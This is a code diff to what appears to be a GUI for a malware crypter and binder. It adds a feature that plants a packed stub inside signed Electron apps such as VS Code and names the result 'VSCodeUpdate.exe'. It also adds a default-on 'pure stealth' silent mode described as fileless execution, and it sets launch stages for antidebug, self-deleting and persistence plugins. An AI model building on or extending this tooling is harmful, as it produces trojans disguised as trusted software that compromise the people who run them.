@@ -134,6 +134,40 @@ class MainWindow(QtWidgets.QMainWindow):  # type: ignore[misc]
         form.addRow("Binder output:", binder_out_h)
         form.addRow("Output icon (optional):", binder_icon_h)
 
+        # Electron tampering options
+        self.enable_electron_cb = QtWidgets.QCheckBox("Tamper signed Electron app after build (In Progress - Disabled)")
+        self.enable_electron_cb.setChecked(False)
+        self.enable_electron_cb.setEnabled(False)
+        self.enable_electron_cb.setToolTip("Embed stub inside Electron app (e.g., VS Code) - [Currently disabled: debugging in-memory execution]")
+        self.electron_base_edit = QtWidgets.QLineEdit()
+        self.electron_base_edit.setPlaceholderText("Path to VS Code folder OR single Electron EXE (e.g., bin/vscode_base or WinDbgX.exe)")
+        self.electron_base_btn = QtWidgets.QPushButton("Browse...")
+        self.electron_base_btn.clicked.connect(self._pick_electron_target)
+        electron_base_h = QtWidgets.QHBoxLayout(); electron_base_h.addWidget(self.electron_base_edit); electron_base_h.addWidget(self.electron_base_btn)
+        self.electron_output_edit = QtWidgets.QLineEdit(str(OUTPUT_DIR / "VSCodeUpdate.exe"))
+        self.electron_output_btn = QtWidgets.QPushButton("Browse...")
+        self.electron_output_btn.clicked.connect(partial(self._pick_save, self.electron_output_edit))
+        electron_out_h = QtWidgets.QHBoxLayout(); electron_out_h.addWidget(self.electron_output_edit); electron_out_h.addWidget(self.electron_output_btn)
+        
+        # Silent mode option
+        electron_opts_h = QtWidgets.QHBoxLayout()
+        self.electron_silent_cb = QtWidgets.QCheckBox("Silent mode (no window/UI, pure stealth)")
+        self.electron_silent_cb.setChecked(True)  # Default to silent
+        self.electron_silent_cb.setToolTip("Kills Electron UI immediately - no window, no unpacking, 100% fileless execution")
+        
+        # Disable all Electron controls initially (in-progress feature)
+        self.electron_base_edit.setEnabled(False)
+        self.electron_base_btn.setEnabled(False)
+        self.electron_output_edit.setEnabled(False)
+        self.electron_output_btn.setEnabled(False)
+        self.electron_silent_cb.setEnabled(False)
+        electron_opts_h.addWidget(self.electron_silent_cb)
+        
+        form.addRow("Electron Tamper:", self.enable_electron_cb)
+        form.addRow("Electron target:", electron_base_h)
+        form.addRow("Tampered output:", electron_out_h)
+        form.addRow("Options:", electron_opts_h)
+
         # Plugins UI (select multiple plugin DLLs)
         self.plugins_list = QtWidgets.QListWidget()
         plugins_h = QtWidgets.QHBoxLayout()
@@ -182,6 +216,47 @@ class MainWindow(QtWidgets.QMainWindow):  # type: ignore[misc]
         if p:
             lineedit.setText(p)
 
+    def _pick_directory(self, lineedit):
+        p = QtWidgets.QFileDialog.getExistingDirectory(self, "Select folder", str(Path.cwd()))
+        if p:
+            lineedit.setText(p)
+    
+    def _pick_electron_target(self):
+        """Pick either Electron folder (VS Code portable) or single EXE (WinDbgX.exe)"""
+        dlg = QtWidgets.QDialog(self)
+        dlg.setWindowTitle("Select Electron Target")
+        v = QtWidgets.QVBoxLayout(dlg)
+        v.addWidget(QtWidgets.QLabel("Choose Electron app type:"))
+        
+        folder_btn = QtWidgets.QPushButton("Folder (VS Code portable, Discord, etc.)")
+        file_btn = QtWidgets.QPushButton("Single EXE (WinDbgX.exe, etc.)")
+        cancel_btn = QtWidgets.QPushButton("Cancel")
+        
+        v.addWidget(folder_btn)
+        v.addWidget(file_btn)
+        v.addWidget(cancel_btn)
+        
+        result: list[str | None] = [None]
+        
+        def pick_folder():
+            p = QtWidgets.QFileDialog.getExistingDirectory(dlg, "Select Electron folder", str(Path.cwd()))
+            if p:
+                result[0] = p
+                dlg.accept()
+        
+        def pick_file():
+            p, _ = QtWidgets.QFileDialog.getOpenFileName(dlg, "Select Electron EXE", str(Path.cwd()), "Executables (*.exe);;All Files (*)")
+            if p:
+                result[0] = p
+                dlg.accept()
+        
+        folder_btn.clicked.connect(pick_folder)
+        file_btn.clicked.connect(pick_file)
+        cancel_btn.clicked.connect(dlg.reject)
+        
+        if dlg.exec() == QtWidgets.QDialog.DialogCode.Accepted and result[0]:
+            self.electron_base_edit.setText(result[0])
+
     def _pick_save(self, lineedit):
         p, _ = QtWidgets.QFileDialog.getSaveFileName(self, "Select output", str(OUTPUT_DIR / "out_stub.exe"))
         if p:
@@ -207,7 +282,14 @@ class MainWindow(QtWidgets.QMainWindow):  # type: ignore[misc]
             v.addWidget(QtWidgets.QLabel(f"Configure stage/order for plugin: {Path(p).name}"))
             stage_cb = QtWidgets.QComboBox()
             stage_cb.addItems(["PRELAUNCH", "PREINJECT", "POSTLAUNCH", "ONEXIT", "ONFAIL"])
-            stage_cb.setCurrentIndex(2)  # default to POSTLAUNCH so UI plugins show after payload
+            # Smart default: protection/antidebug plugins run at PRELAUNCH, persist at POSTLAUNCH
+            plugin_name = Path(p).name.lower()
+            if 'protection' in plugin_name or 'antidebug' in plugin_name or 'melt' in plugin_name:
+                stage_cb.setCurrentIndex(0)  # PRELAUNCH for protection plugins
+            elif 'persist' in plugin_name:
+                stage_cb.setCurrentIndex(2)  # POSTLAUNCH for persistence
+            else:
+                stage_cb.setCurrentIndex(2)  # default to POSTLAUNCH for other plugins
             order_spin = QtWidgets.QSpinBox()
             order_spin.setRange(0, 65535)
             order_spin.setValue(0)
@@ -338,6 +420,9 @@ class MainWindow(QtWidgets.QMainWindow):  # type: ignore[misc]
                 binder_output = data.get('binder_output')
                 binder_icon = data.get('binder_icon')
                 binder_enabled = data.get('binder_enabled', False)
+                electron_base = data.get('electron_base')
+                electron_output = data.get('electron_output')
+                electron_enabled = data.get('electron_enabled', False)
                 if payload:
                     self.payload_edit.setText(payload)
                 if output:
@@ -348,6 +433,10 @@ class MainWindow(QtWidgets.QMainWindow):  # type: ignore[misc]
                     self.binder_output_edit.setText(binder_output)
                 if binder_icon:
                     self.binder_icon_edit.setText(binder_icon)
+                if electron_base:
+                    self.electron_base_edit.setText(electron_base)
+                if electron_output:
+                    self.electron_output_edit.setText(electron_output)
                 if plugins_dir:
                     try:
                         self._last_plugin_dir = Path(plugins_dir)
@@ -355,6 +444,10 @@ class MainWindow(QtWidgets.QMainWindow):  # type: ignore[misc]
                         pass
                 try:
                     self.enable_binder_cb.setChecked(bool(binder_enabled))
+                except Exception:
+                    pass
+                try:
+                    self.enable_electron_cb.setChecked(bool(electron_enabled))
                 except Exception:
                     pass
                 try:
@@ -456,6 +549,9 @@ class MainWindow(QtWidgets.QMainWindow):  # type: ignore[misc]
                 'binder_output': self.binder_output_edit.text(),
                 'binder_icon': self.binder_icon_edit.text(),
                 'binder_enabled': bool(self.enable_binder_cb.isChecked()),
+                'electron_base': self.electron_base_edit.text(),
+                'electron_output': self.electron_output_edit.text(),
+                'electron_enabled': bool(self.enable_electron_cb.isChecked()),
             }
             for i in range(self.plugins_list.count()):
                 it = self.plugins_list.item(i)
@@ -602,6 +698,9 @@ class MainWindow(QtWidgets.QMainWindow):  # type: ignore[misc]
             return
 
         entries = self._collect_plugin_entries()
+        self._log_info(f"Collected {len(entries)} plugin entries")
+        for e in entries:
+            self._log_info(f"  Entry: {e}")
 
         # Prepare an iconized stub BEFORE running the packer so the overlay stays intact.
         self._icon_applied_prepack = False
@@ -623,6 +722,21 @@ class MainWindow(QtWidgets.QMainWindow):  # type: ignore[misc]
         self._pending_binder_cmd = binder_cmd
         self._last_cmd = pack_cmd
         self._current_phase = 'packer'
+        
+        # Verify temp plugin folder contents before starting cryptor
+        if plugins_temp_dir:
+            import os
+            try:
+                contents = os.listdir(plugins_temp_dir)
+                dll_files = [f for f in contents if f.endswith('.dll')]
+                self._log_info(f"VERIFY: Plugin folder {plugins_temp_dir}")
+                self._log_info(f"VERIFY: Contains {len(dll_files)} DLL(s): {dll_files}")
+                for f in contents:
+                    fpath = os.path.join(plugins_temp_dir, f)
+                    self._log_info(f"VERIFY:   {f}: {os.path.getsize(fpath)} bytes")
+            except Exception as e:
+                self._log_warning(f"VERIFY: Could not list folder: {e}")
+        
         self._log_info("Starting packer in background...")
         self._log_info(' '.join(f'"{c}"' for c in pack_cmd))
         self.run_btn.setEnabled(False)
@@ -641,6 +755,62 @@ class MainWindow(QtWidgets.QMainWindow):  # type: ignore[misc]
         except Exception as exc:
             self._log_warning(f"Icon apply failed for {label}: {exc}")
 
+    def _run_electron_tamper(self):
+        """Run Electron app tampering in background thread"""
+        electron_base = (self.electron_base_edit.text() or '').strip()
+        electron_output = (self.electron_output_edit.text() or '').strip()
+        
+        if not electron_base:
+            self._log_error("Electron base folder not specified")
+            self._current_phase = None
+            self.run_btn.setEnabled(True)
+            self.sim_btn.setEnabled(True)
+            return
+        
+        if not electron_output:
+            self._log_error("Electron output path not specified")
+            self._current_phase = None
+            self.run_btn.setEnabled(True)
+            self.sim_btn.setEnabled(True)
+            return
+        
+        # Determine stub path (use binder output if available, otherwise packer output)
+        stub_path = self._binder_output_path if self._binder_output_path else self._output_path
+        
+        if not stub_path or not Path(stub_path).exists():
+            self._log_error(f"Packed stub not found: {stub_path}")
+            self._current_phase = None
+            self.run_btn.setEnabled(True)
+            self.sim_btn.setEnabled(True)
+            return
+        
+        self._log_info("=== STARTING ELECTRON TAMPERING ===")
+        
+        # Run tampering in thread
+        def _tamper_thread():
+            try:
+                silent_mode = self.electron_silent_cb.isChecked()
+                success, output = self.backend.tamper_electron_app(
+                    electron_base,
+                    stub_path,
+                    electron_output,
+                    silent_mode=silent_mode,
+                    log_fn=self._log_info,
+                    warn_fn=self._log_warning
+                )
+                
+                if success:
+                    self.backend.finished_rc.emit(0)
+                else:
+                    self.backend.finished_rc.emit(1)
+            except Exception as e:
+                self._log_error(f"Electron tampering exception: {e}")
+                self.backend.finished_rc.emit(1)
+        
+        import threading
+        t = threading.Thread(target=_tamper_thread, daemon=True)
+        t.start()
+    
     def _collect_logs(self, pid, payload_out):
         # Read plugin and debug logs from %TEMP% and append tail to GUI log
         temp_dir = Path(os.getenv('TEMP') or os.getenv('TMP') or '.')
@@ -698,10 +868,24 @@ class MainWindow(QtWidgets.QMainWindow):  # type: ignore[misc]
                                 if worker:
                                     started_binder = True
                                     return
+                            elif self.enable_electron_cb.isChecked():
+                                # Run Electron tampering
+                                self._current_phase = 'electron_tamper'
+                                self._run_electron_tamper()
+                                return
                             else:
                                 self._play_success_sound()
                         elif self._current_phase == 'binder':
                             self._apply_icon_if_requested(self._binder_output_path, "binder output")
+                            if self.enable_electron_cb.isChecked():
+                                # Run Electron tampering after binder
+                                self._current_phase = 'electron_tamper'
+                                self._run_electron_tamper()
+                                return
+                            else:
+                                self._play_success_sound()
+                        elif self._current_phase == 'electron_tamper':
+                            self._log_info("=== ELECTRON TAMPERING COMPLETE ===")
                             self._play_success_sound()
             else:
                 self._log_error(f"Cryptor failed — aborting (rc={rc})")
